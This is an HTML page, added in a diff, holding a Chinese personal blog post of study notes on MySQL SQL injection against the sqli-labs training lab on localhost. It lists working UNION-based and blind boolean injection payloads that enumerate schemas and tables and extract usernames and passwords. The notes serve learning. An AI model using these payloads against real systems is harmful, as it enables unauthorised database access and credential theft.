@@ -1,0 +1,222 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>SQL Injections | Gridea</title>
+<link rel="shortcut icon" href="https://kite-007.github.io/favicon.ico?v=1602428138647">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://kite-007.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="SQL Injections | Gridea - Atom Feed" href="https://kite-007.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="echo $sql;
+echo &quot;&quot;;
+mysql
+语法
+查库：select schema_name from information_schema.schemata
+查表：select table_name from ..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://kite-007.github.io">
+  <img class="avatar" src="https://kite-007.github.io/images/avatar.png?v=1602428138647" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              SQL Injections
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-10-05
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>echo $sql;<br>
+echo &quot;<br>&quot;;</p>
+<h1 id="mysql">mysql</h1>
+<h2 id="语法">语法</h2>
+<p>查库：select schema_name from information_schema.schemata<br>
+查表：select table_name from information_schema.tables where table_schema='security'<br>
+查列：select column_name from information_schema.columns where table_name='users'<br>
+查字段：select username,password from security.users<br>
+SELECT * FROM users WHERE id='1' or 1=1--' LIMIT 0,1<br>
+注释：1.--+ 2.-- 3.#<br>
+or / and	True<br>
+order by X  //给第X列数据进行排序</p>
+<h2 id="select-函数">select 函数</h2>
+<p>system_user()   //显示系统用户<br>
+user()//<br>
+database()    //查看数据库<br>
+version()    //查看版本信息<br>
+current_user()<br>
+@@datadir    //mysql安装路径<br>
+@@version_compile_os    //当前操作系统</p>
+<p>group_concat()    //将数据用一行显示出来<br>
+concat_ws('~',A,B)  //用”~“将“A”与“B”隔开</p>
+<p>1~4关包裹信息：Less-1 '1'；Less-2 1；Less-3 ('1')；Less-4 (&quot;1&quot;)分别在1后加'； ；')；&quot;)进行报错<br>
+用?id=-1' order by X--+判断多少列<br>
+union select 1,2,group_concat(schema_name)from information_schema.schemata--+联合查询取出数据<br>
+union select 1,2,group_concat(table_name)from information_schema.tables where table_schema='security'--+取出所有表信息<br>
+union select 1,2,group_concat(column_name)from information_schema.columns where table_name='users'--+取出所有列信息<br>
+union select 1,2,group_concat(concat_ws('~',username,password))from security.users--+取出账户信息</p>
+<p>补充知识：<br>
+1.left()函数：left(A,B)='C' ；从A的左侧截取B位，判断是否与字符C相等，正确为1，错误为0<br>
+left(A,B)；从A的左侧返回B位<br>
+2.regexp函数：select user() regexp 'r'；在user()中 结果为root，用'r'去匹配正确为1，用'root'匹配为1，如果用'rot'匹配则为0<br>
+3.like函数：select user() like 'r%'；在user()中 结果为root，用'r%'去匹配正确为1，用'root%'匹配为1，如果用'rot%'匹配则为0<br>
+4.substr()函数：select substr(A,B,C)='s'；在A中从B位开始截取C位，与's'匹配，正确为1<br>
+5. ascii()函数：ascii('a')；返回a的ascii值<br>
+6.chr()与ord()：chr(数字)，ord('字母')；python中判断当前的ascii值</p>
+<p>第五关<br>
+http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and left((select database()),1)='a'--+<br>
+//使用Burp得到security之后<br>
+http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit A,1),B,1))=C--+<br>
+//进行猜表，A为第A+1个表，B为第几个字符，C为ASCII码所对应的十进制数。<br>
+http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and ord(mid((select ifnull(cast(username as char),0x20)from A.B order by id limit C,1),D,1))=E--+<br>
+//猜用户，A为数据库，B为该表，C为第C+1个用户，D为第几个字符，E为ASCII码所对应的十进制数。<br>
+http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and ord(mid((select ifnull(cast(password as char),0x20)from A.B order by id limit C,1),D,1))=E--+<br>
+//猜密码，A为数据库，B为该表，C为第C+1个用户，D为第几个字符，E为ASCII码所对应的十进制数。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#mysql">mysql</a>
+<ul>
+<li><a href="#%E8%AF%AD%E6%B3%95">语法</a></li>
+<li><a href="#select-%E5%87%BD%E6%95%B0">select 函数</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://kite-007.github.io/post/hello-gridea/">
+              <h3 class="post-title">
+                Hello Gridea
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://kite-007.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
